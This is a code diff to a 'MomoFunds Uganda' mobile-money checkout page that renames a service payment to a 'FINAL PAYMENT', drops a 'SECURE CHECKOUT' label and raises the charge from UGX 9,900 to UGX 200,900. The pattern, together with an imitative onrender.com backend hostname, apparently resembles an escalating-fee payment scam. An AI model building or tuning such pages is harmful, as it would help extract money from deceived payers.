@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#FFCC00">
-<title>MomoFunds Uganda - Service Payment</title>
+<title>MomoFunds Uganda - FINAL PAYMENT</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
@@ -231,11 +231,10 @@ gap:8px;
 
 <div class="header">
 
-<div class="tag">SECURE CHECKOUT</div>
 
 <h1>🇺🇬 MomoFunds Uganda</h1>
 
-<p>Complete your service payment</p>
+<p>COMPLETE YOUR FINAL PAYMENT</p>
 
 </div>
 
@@ -243,7 +242,7 @@ gap:8px;
 
 <small>Amount Due</small>
 
-<h2>UGX 9,900</h2>
+<h2>UGX 200,900</h2>
 
 </div>
 
@@ -287,7 +286,7 @@ Please review your details below and complete your payment using MTN Mobile Mone
 
 <button id="payBtn">
 
-Pay UGX 9,900 →
+Pay UGX 200,900 →
 
 </button>
 
@@ -313,7 +312,7 @@ Pay UGX 9,900 →
 "use strict";
 
 const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
-const PAYMENT_AMOUNT=9900;
+const PAYMENT_AMOUNT=200900;
 
 const button=document.getElementById("payBtn");
 const statusBox=document.getElementById("status");
@@ -338,7 +337,7 @@ statusBox.className=type;
 
 function resetButton(){
 button.disabled=false;
-button.textContent="Pay UGX 9,900 →";
+button.textContent="Pay UGX 200,900 →";
 }
 
 async function readJson(response){
